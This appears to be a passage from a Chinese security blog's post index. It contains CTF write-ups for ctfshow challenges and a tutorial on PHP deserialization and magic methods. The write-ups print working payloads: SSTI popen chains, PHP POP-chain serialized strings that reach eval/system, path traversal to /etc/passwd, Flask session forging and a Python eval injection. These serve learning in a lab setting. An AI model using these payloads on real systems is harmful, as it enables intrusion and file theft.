os\n{{os.popen('whoami').read()}}\n```\n\n需要注意的是，这里的话需要用一个换行去将`%`语句和`{{}}`表达式语句分开\n\n```python\n?name=%25import%20os%0A%7B%7Bos.popen('whoami').read()%7D%7D\n```\n\n![image-20250818143102651](../image/achieve/202411/Bottle内存马/image-20250818143102651.png)\n\n当然前提是用户的输入直接被当成模板去渲染而不是那种类似拼接的方式\n\n#### include()语法\n\n![image-20250818135758568](../image/achieve/202411/LilCTF2025/image-20250818135758568.png)\n\n使用指定的变量呈现子模板，并将结果文本插入到当前模板中。该函数返回一个字典，其中包含传递给子模板或在子模板中定义的局部变量\n\n```python\ninclude(template_name, **kwargs)\n```\n\n`template_name`：子模板名，可以是文件名或者字符串模板。\n\n`**kwargs`：子模板的局部变量，会覆盖父模板同名变量。\n\n#### rebase()语法\n\n将当前模板标记为以后要包含到其他模板中。在呈现当前模板之后，其结果文本存储在一个名为base的变量中，并传递给base-template，然后呈现。\n\n","tags":["python内存马"],"categories":["python内存马"]},{"title":"ctfshow原谅杯","url":"/2025/08/14/ctfshow原谅杯/","content":"\n## 原谅4\n\n```php\n<?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__);\n```\n\n传入?xbx=ls，根目录看到一个flag，但是好像权限很低，读不出来\n\n看到一个yuanliang_4_xxx.zip，访问之后把zip下下来\n\n一个图片和一个txt文件，emmmm这个打比赛还有瓜吃\n\n回头看命令好像很多都不能用，看一下bin文件下发现只有ls rm sh能用\n","tags":["原谅杯"],"categories":["ctfshow"]},{"title":"ctfshow2023愚人杯","url":"/2025/08/12/ctfshow2023愚人杯/","content":"\n## easy_signin\n\n![image-20250812180316422](../image/achieve/202411/愚人杯/image-20250812180316422.png)\n\n把base64删掉后就出现了file_get_contents，并且这里是需要base64编码传进去的，试一下`../../../etc/passwd`\n\n![image-20250812180759692](../image/achieve/202411/愚人杯/image-20250812180759692.png)\n\n这里会渲染成图片，把base64解码后就能拿到了\n\n读一下index.php，里面就有flag\n\n```php\n<?php\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2023-03-27 10:30:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2023-03-28 12:15:33\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n$image=$_GET['img'];\n\n$flag = \"ctfshow{1275d180-310c-440d-9c2f-4a5d9c9bc63d}\";\nif(isset($image)){\n\t$image = base64_decode($image);\n\t$data = base64_encode(file_get_contents($image));\n\techo \"<img src='data:image/png;base64,$data'/>\";\n}else{\n\t$image = base64_encode(\"face.png\");\n\theader(\"location:/?img=\".$image);\n}\n```\n\n## 被遗忘的反序列化\n\n```php\n<?php\n\n# 当前目录中有一个txt文件哦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this->text == \"aaaa\"){\n            echo lcfirst($this->text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -> aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -> a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key)){\n            $this->key = file_get_contents($this -> file);\n        }else{\n            echo \"不行哦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this->aaa;\n    }\n\n    public function __invoke(){\n        $this -> aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n```\n\n这里的话不难看出有两个利用点，一个是`w_wuw_w::__wakeup()`可以读文件，一个是`cycycycy::aaa()`有eval\n\n根据这里的提示，有一个check.php文件，尝试把他读出来\n\n```php\n<?php\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n$a = new w_wuw_w();\n$a -> file = \"php://filter/read=convert.base64-encode/resource=check.php\";\n$a -> aaa = &$a -> key;\necho serialize($a);\n```\n\n这里的话是利用了一个地址指向的操作，让我们获取到的key的地址赋值给aaa，而在destruct中会有对aaa的输出，那么就能打印出key的内容了\n\n![image-20250813152043875](../image/achieve/202411/愚人杯/image-20250813152043875.png)\n\n```php\n<?php\n\nfunction cipher($str) {\n\n    if(strlen($str)>10000){\n        exit(-1);\n    }\n\n    $charset = \"qwertyuiopasdfghjklzxcvbnm123456789\";\n    $shift = 4;\n    $shifted = \"\";\n\n    for ($i = 0; $i < strlen($str); $i++) {\n        $char = $str[$i];\n        $pos = strpos($charset, $char);\n\n        if ($pos !== false) {\n            $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset);\n            $shifted .= $charset[$new_pos];\n        } else {\n            $shifted .= $char;\n        }\n    }\n\n    return $shifted;\n}\n```\n\n这个就是aaa()中的加密函数，一个简单的凯撒移位加密，将获取到的字符串的每个字符往左移4位，字符顺序就是charset属性\n\n关注到题目提示目录下有一个txt文件，然后可以看到gBoBg下有一个__toString()，这里有一个原生类调用的口子\n\n```php\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n```\n\n那我们用**GlobIterator类**去读一下目录\n\n```php\n<?php\nclass w_wuw_w{\n    public $aaa;\n}\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}\n$a = new w_wuw_w();\n$a -> aaa = new gBoBg();\n$a -> aaa -> coos = \"GlobIterator\";\n$a -> aaa -> file = \"*\";\n$a -> aaa -> name = \"111\";\necho serialize($a);\n```\n\n拿到一个h1nt.txt，读一下\n\n```php\n#用于check.php\n\nkey：qwertyuiopasdfghjklzxcvbnm123456789\n\nmove：2~4\n```\n\n其实这个hint没啥用，我们已经直接读到check.php了\n\n其实到这的话可以发现这道题就有很多预期解了，要么就是探测出flag的具体文件名，要么就是直接打RCE\n\n这里我还是写预期解，也就是RCE吧\n\n然后我们写poc\n\n```php\n<?php\nclass gBoBg{\n    public $file;\n    public $coos;\n}\nclass w_wuw_w{\n    public $aaa;\n}\n$a = new w_wuw_w();\n$a -> aaa = new gBoBg();\n$a -> aaa -> file = \"aaa\";     //绕过else if 判断\n$a -> aaa -> coos = new w_wuw_w();\necho serialize($a);\n//w_wuw_w::__destruct()->gBoBg::__toString()->w_wuw_w::__invoke()->EeE::__clone()->cycycycy::aaa()\n```\n\n所以最后的请求包\n\n```html\nPOST /?get=fe1ka1ele1efp HTTP/1.1\nHost: 81344772-6bac-4087-a5ea-585b5bf6b62e.challenge.ctf.show\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\nSec-Ch-Ua: \"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nAaaaaa: O:7:\"w_wuw_w\":1:{s:3:\"aaa\";O:5:\"gBoBg\":2:{s:4:\"file\";s:3:\"aaa\";s:4:\"coos\";r:1;}}\nReferer: https://81344772-6bac-4087-a5ea-585b5bf6b62e.challenge.ctf.show/\nPriority: u=0, i\nConnection: keep-alive\nContent-Length: 28\nContent-Type: application/x-www-form-urlencoded\n\neval=system('cat+/f1agaaa');\n```\n\n## easy_php\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2023-03-24 10:16:33\n# @Last Modified by:   h1xa\n# @Last Modified time: 2023-03-25 00:25:52\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        system($this->ctfshow);\n    }\n\n}\n\n$data = $_GET['1+1>2'];\n\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n\n\n?>\n```\n\n一个很简单的wakeup绕过，用原生类去包装一下就行了\n\n```php\n<?php\nclass ctfshow{\n}\n$a = new SplObjectStorage();\n$a -> test = new ctfshow();\n$a -> test -> ctfshow = \"whoami\";\necho serialize($a);\n?>\n```\n\n然后需要注意的是我们传入的1+1>2是需要编码的，不然+号会被认为是空格\n\n```html\n?1%2b1>2=C:16:\"SplObjectStorage\":70:{x:i:0;m:a:1:{s:4:\"test\";O:7:\"ctfshow\":1:{s:7:\"ctfshow\";s:6:\"whoami\";}}}\n```\n\ndie()是不会影响反序列化的进行的，因为对象是存在内存中的，die只是终止脚本的运行，不影响php的GC回收机制销毁内存中的对象\n\n![image-20250813163914564](../image/achieve/202411/愚人杯/image-20250813163914564.png)\n\n## easy_ssti\n\n源码找到一个app.zip\n\n```python\nfrom flask import Flask\nfrom flask import render_template_string,render_template\napp = Flask(__name__)\n\n@app.route('/hello/')\ndef hello(name=None):\n    return render_template('hello.html',name=name)\n@app.route('/hello/<name>')\ndef hellodear(name):\n    if \"ge\" in name:\n        return render_template_string('hello %s' % name)\n    elif \"f\" not in name:\n        return render_template_string('hello %s' % name)\n    else:\n        return 'Nonononon'\n\n```\n\n路径输入`/hello/{{8*8}}`返回hello 64，直接打ssti就行了，绕过的话直接用旁路注入外带参数就很方便\n\n```html\n/hello/{{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen'](request.values.a).read()}}?a=cat+/flag\n```\n\n## easy_flask\n\n一个登录口，有一个注册页面，先注册一个1111/111111登录看看\n\n![image-20250813173037990](../image/achieve/202411/愚人杯/image-20250813173037990.png)\n\n有一个leran的`/show/`接口，但是只给了部分源码\n\n```python\n\n# app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n\n}\n\n@app.route('/')\ndef index():\n# Check if user is loggedin\nif 'loggedin' in session:\nreturn redirect(url_for('profile'))\nreturn redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\nmsg = ''\nif request.method == 'POST' and 'username' in request.form and 'password' in request.form:\nusername = request.form['username']\npassword = request.form['password']\nif username in users and password == users[username]['password']:\nsession['loggedin'] = True\nsession['username'] = username\nsession['role'] = users[username]['role']\nreturn redirect(url_for('profile'))\nelse:\nmsg = 'Incorrect username/password!'\nreturn render_template('login.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\nmsg = ''\nif request.method == 'POST' and 'username' in request.form and 'password' in request.form:\nusername = request.form['username']\npassword = request.form['password']\nif username in users:\nmsg = 'Account already exists!'\nelse:\nusers[username] = {'password': password, 'role': 'user'}\nmsg = 'You have successfully registered!'\nreturn render_template('register.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\nif 'loggedin' in session:\nreturn render_template('profile2.html', username=session['username'], role=session['role'])\nreturn redirect(url_for('login'))\n......\n```\n\n拿到key了，试着解密一下session\n\n```bash\nroot@VM-16-12-ubuntu:/home/ubuntu# flask-unsign --decode --cookie \"eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjExMTEifQ.aJxbNA.Bjred7ZyAItaME1fcFrYPimeaEY\"\n{'loggedin': True, 'role': 'user', 'username': '1111'}\n```\n\n既然这里有key的话，试着伪造一下admin\n\n```bash\nroot@VM-16-12-ubuntu:/home/ubuntu# flask-unsign --sign --cookie \"{'loggedin': True, 'role': 'admin', 'username': '1111'}\" --secret 'S3cr3tK3y'\neyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMTExIn0.aJxcQQ.brvd49dIzi5itGCHr13s_JUByzE\n```\n\n![image-20250813173518447](../image/achieve/202411/愚人杯/image-20250813173518447.png)\n\n好吧，假的flag~换个地方去做一下\n\n在源码中发现一个路由可以下载文件\n\n![image-20250813174935991](../image/achieve/202411/愚人杯/image-20250813174935991.png)\n\n传入/download/?filename=/etc/passwd发现可以读取敏感文件，那就直接读一下app.py\n\n```python\n# app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n\n```\n\n在/hello/路由下发现一个eval，`eval()` 会执行 Python 表达式，把字符串当作 Python 代码运行。\n\n直接打就行\n\n```python\n/hello/?eval=__import__('os').popen('cat /flag_is_h3re').read()\n```\n\n\n\n","tags":["2023愚人杯"],"categories":["ctfshow"]},{"title":"PHP反序列化","url":"/2025/08/12/PHP反序列化/","content":"\n## PHP反序列化是什么\n\n知识点:\n\n### 序列化（Serialization）\n\n是将数据结构或对象转换成一种可存储或可传输格式的过程。在序列化后，数据可以被写入文件、发送到网络或存储在数据库中，以便在需要时可以再次还原成原始的数据结构或对象。序列化的过程通常涉及将数据转换成字节流或类似的格式，使其能够在不同平台和编程语言之间进行传输和交换。\n\n### 反序列化（Deserialization）\n\n是序列化的逆过程，即将序列化后的数据重新还原成原始的数据结构或对象。反序列化是从文件、网络数据或数据库中读取序列化的数据，并将其转换回原始形式，以便在程序中进行使用和操作。\n\n反序列化的过程中，unserialize()接收的值(字符串)可控\n通过更改这个值，得到所需要的代码\n通过调用方法，触发代码执行\n魔术方法在特定条件下自动调用相关方法，最终导致触发代码。\n\n### 序列化存储格式\n\n`php`序列化的存储格式是`json`,我们来理解一下这个字符串的格式\n\n首先利用`serialize`生成一个字符串\n\n```php\n<?php\nclass me{\n\tpublic $name=\"meng\";\n\tpublic $age=\"19\";\n    public $languages=\"CN\";\n}\necho serialize(new me());\n?>\n/*\nO:2:\"Me\":3:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";s:9:\"languages\";s:2:\"CN\";}\n*/\n```\n\n- `O:2:\"me\"`表示这个是一个对象且类名为`me`,\n- `3`表示该类有三个属性\n- `s:4:\"name\";s:3:\"meng\";`表示第一个属性为字符串，且属性名为`name`,属性值为字符串,属性内容为`meng\n\n一般的序列化字符串的格式是\n\n```\n变量类型:类名长度:类名:属性数量:{属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容}\n```\n\n### 常见的类型标志\n\n| 符号 | 类型描述                                       |\n| ---- | ---------------------------------------------- |\n| a    | array 数组型                                   |\n| b    | boolean 布尔型                                 |\n| d    | double 浮点型                                  |\n| i    | integer 整数型                                 |\n| o    | common object 共同对象                         |\n| r    | object reference 对象引用                      |\n| s    | non-escaped binary string 非转义的二进制字符串 |\n| S    | escaped binary string 转义的二进制字符串       |\n| C    | custom object 自定义对象                       |\n| O    | class 对象                                     |\n| N    | null 空                                        |\n| R    | pointer reference 指针引用                     |\n| U    | unicode string Unicode 编码的字符串            |\n\n那么我们如果得到一个序列化字符串如何快速的得到原来的内容呢，这就是反序列化了！\n\n```php\n<?php\n$data='O:2:\"Me\":3:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";s:9:\"languages\";s:2:\"CN\";}';\nvar_dump(unserialize($data));\n/*\nclass __PHP_Incomplete_Class#1 (4) {\n  public $__PHP_Incomplete_Class_Name =>\n  string(2) \"me\"\n  public $name =>\n  string(4) \"meng\"\n  public $age =>\n  string(2) \"18\"\n  public $languages =>\n  string(2) \"CN\"\n}\n```\n\n那么我们就得到了这个字符串是如何序列化而来，并且也确实像前面说的一样起到了存储数据的功能\n\n## 成员类型\n\n分为成员属性和成员方法\n\n### 成员属性\n\n- 属性是类中的变量，用于存储类的状态或数据。\n- 它们可以是基本数据类型（如整数、浮点数、字符串等），也可以是其他对象或类的实例。\n- 属性通常通过访问控制修饰符（如`public`、`protected`、`private`）来定义其访问权限。\n\n### 成员方法\n\n- 方法是类中的函数，用于执行特定的操作或计算。\n- 它们可以访问和修改类的属性，也可以执行其他逻辑操作。\n- 方法同样可以通过访问控制修饰符来定义其访问权限。\n\n### 访问控制修饰符\n\n> public(公有属性)\n>\n> protected(受保护的)\n>\n> private(私有的)\n\n接下来我们分开去解释一下这三种修饰符\n\npublic(公有属性)\n\n- 成员可以在类的内部、外部以及任何继承的子类中被访问。\n- 默认情况下，如果没有指定访问控制修饰符，成员会被视为`public`\n\nprotected(受保护的)\n\n- 成员只能被类的内部、子类以及同一个命名空间内的其他类访问，但不能被类的外部访问。\n- 适用于需要在子类中重写的成员。\n\nprivate(私有的)\n\n- 成员只能被类的内部访问，不能被子类或类的外部访问。\n- 适用于不希望被子类继承或外部访问的成员。\n\n为了更好的区分这三种修饰符，我们来举个例子\n\n```php\n<?php\nclass my{\n    public $name=\"meng\";\n    private $age=\"19\";\n    protected $language=\"CN\";\n}\n\n$obj = new my();\n$data = serialize($obj);\necho $data;\nfile_put_contents(\"data.txt\", $data);\n?>\n```\n\n分别设置三种不同的属性，然后将生成的文件放到010中看一下16进制解析\n\n```php\nO:2:\"my\":3:{s:4:\"name\";s:4:\"meng\";s:6:\"*age\";s:2:\"19\";s:12:\"mylanguage\";s:2:\"CN\";}\n```\n\n这是得到的序列化后的字符串\n\n但因为三种修饰符不一样，得出来的属性长度和属性名都发生了变化\n\n```\npublic:\ns:3:\"age\";s:2:\"18\";\nprotected:\ns:6:\"%00*%00age\";s:2:\"18\";\nprivate:\ns:13:\"%00Me%00languages\";s:2:\"CN\";\n```\n\n总结来说就是\n\n```php\npublic(公有) \nprotected(受保护)     // %00*%00属性名\nprivate(私有的)       // %00类名%00属性名\n```\n\n介绍完修饰符，我们接下来看看php反序列化中最重要的魔术方法\n\n## 魔术方法\n\n| __construct()  | 构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作 |\n| -------------- | ------------------------------------------------------------ |\n| __destruct()   | 析构函数，**当一个对象销毁时被调用**。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 |\n| __toString     | 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串 |\n| __wakeup()     | **调用unserialize()时触发**，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。 |\n| __sleep()      | 调用serialize()时触发 ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误 |\n| __call()       | 在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法 |\n| __callStatic() | 在静态上下文中调用不可访问的方法时触发                       |\n| __get()        | 用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行 |\n| __set()        | 用于将数据写入不可访问的属性                                 |\n| __isset()      | 在不可访问的属性上调用isset()或empty()触发                   |\n| __unset()      | 在不可访问的属性上使用unset()时触发                          |\n| __invoke()     | 当脚本尝试将对象调用为函数时触发                             |\n\n那我们来逐个介绍一下\n\n### __serialize()魔术方法\n\nserialize() 函数会检查类中是否存在一个魔术方法 __serialize() 。如果存在，该方法将在任何序列化之前优先执行。它必须以一个代表对象序列化形式的 键/值 成对的关联数组形式来返回，如果没有返回数组，将会抛出一个 TypeError 错误。\n\n```\n如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。\n```\n\n### __unserialize魔术方法\n\nunserialize() 检查是否存在具有名为 `__unserialize()`的魔术方法。此函数将会传递从 __serialize() 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。\n\n```\n如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n```\n\n影响版本：此特性自 PHP 7.4.0 起可用。\n\n### __construct()构造方法\n\n构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作\n\n声明格式:\n\n```php\nfunction __construct([参数列表]){\n    方法体//通常用来对成员属性进行初始化赋值\n}\n```\n\n使用构造方法时的注意事项：\n\n1、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。\n\n2、构造方法名称是以两个下画线开始的__construct()\n\n举个例子\n\n```php\n<?php\nclass me{\n    public $name=\"men\";\n    public $age=\"18\";\n    public $languages=\"EN\";\n    function __construct($name=\"meng\",$age=\"19\",$languages=\"CN\"){\n        $this->name=$name;\n        $this->age=$age;\n        $this->languages=$languages;\n        echo \"__construct被调用\\n\";\n    }\n}\n$obj=new me();\necho serialize($obj);\n?>\n运行结果:\n__construct被调用\nO:2:\"me\":3:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";s:9:\"languages\";s:2:\"CN\";}\n```\n\n创建对象时被调用并且其中的初始化赋值会直接覆盖最初的赋值\n\n### __destruct()析构方法\n\n析构函数，**当一个对象销毁时被调用**。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行\n\n- **显式销毁对象**（如使用 `unset()` 函数）时，`__destruct()` 会被立即调用。\n\n- **脚本执行结束时**，PHP 会自动销毁所有对象，触发 `__destruct()` 方法。\n\n  析构方法的声明格式\n\n  ```php\n  function __destruct()\n  {\n   //方法体\n  }\n  ```\n\n  举个例子\n\n  ```php\n  <?php\n  class me{\n      public $name=\"men\";\n      public $age=\"18\";\n      public $languages=\"EN\";\n      function __construct($name=\"meng\",$age=\"19\",$languages=\"CN\"){\n          $this->name=$name;\n          $this->age=$age;\n          $this->languages=$languages;\n          echo \"__construct被调用\\n\";\n      }\n      function __destruct(){\n          echo \"__destruct被调用\";\n      }\n  }\n  $obj=new me();\n  echo serialize($obj);\n  echo \"\\n\";\n  ?>\n  /*\n  __construct被调用\n  O:2:\"me\":3:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";s:9:\"languages\";s:2:\"CN\";}\n  __destruct被调用\n  */\n  ```\n\n  析构方法的作用\n\n  ```php\n  一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。\n  ```\n\n### __toString()方法\n\n当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串\n\n注意：\n\n```\n此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。\n```\n\n警告：\n\n```php\n不能在 __toString() 方法中抛出异常。这么做会导致致命错误。\n```\n\n举个例子:\n\n```php\n<?php\nclass me{\n    public $name=\"men\";\n    public $age=\"18\";\n    public $languages=\"EN\";\n    function __construct(){\n        $this->name=\"meng\";\n        $this->age=\"19\";\n        $this->languages=\"CN\";\n        echo \"__construct被调用\\n\";\n    }\n    public function __toString(){\n        return \"__toString被调用\\n\";\n    }\n}\n$obj=new me();\necho $obj;\necho serialize($obj);\necho \"\\n\";\n/*\n__construct被调用\n__toString被调用\nO:2:\"me\":3:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";s:9:\"languages\";s:2:\"CN\";}\n```\n\n可以看到，在类实例化成字符串后可以输出\"__tostring被调用\",但我们将$obj序列化后就会报错显示这个函数必须返回一个字符串\n\n### __sleep()方法\n\n**调用serialize()时触发** ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。**serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作**。此功能可以**用于清理对象**，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误\n\n此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。\n\n如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。\n\n注意：\n\n```php\n__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。\n```\n\n作用：\n\n```php\n__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。\n```\n\n```php\n<?php\nclass me{\n    public $name=\"men\";\n    public $age=\"18\";\n    public $languages=\"EN\";\n    function __construct(){\n        $this->name=\"meng\";\n        $this->age=\"19\";\n        $this->languages=\"CN\";\n        echo \"__construct被调用\\n\";\n    }\n    function __sleep(){\n        echo \"__sleep被调用\\n\";\n        return [\"name\",\"age\"];\n    }\n}\n$obj=new me();\necho serialize($obj);\necho \"\\n\";\n?>\n/*\n__construct被调用\n__sleep被调用\nO:2:\"me\":2:{s:4:\"name\";s:4:\"meng\";s:3:\"age\";s:2:\"19\";}\n*/\n```\n\n这个魔术方法就是用来控制那些属性可以被序列化,并且是先序列化一步执行\n\n### __call()方法\n\n在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法\n\n该方法有两个参数，第一个参数 `$function_name` 会自动接收不存在的方法名，第二个 `$arguments` 则以数组的方式接收不存在方法的多个参数。\n\n__call() 方法的格式：\n\n```php\nfunction __call(string $function_name, array $arguments)\n{\n    // 方法体\n}\n```\n\n__call() 方法的作用：\n\n1. 为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。\n2. 该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。\n\n举个例子\n\n```php\n<?php\nclass Person\n{                             \n    function say()\n    {                       \n           echo \"Hello, world!\\n\"; \n    }              \n    function __call($funName, $arguments)\n    { \n          echo \"你所调用的函数：\" . $funName . \"(参数：\" ;  // 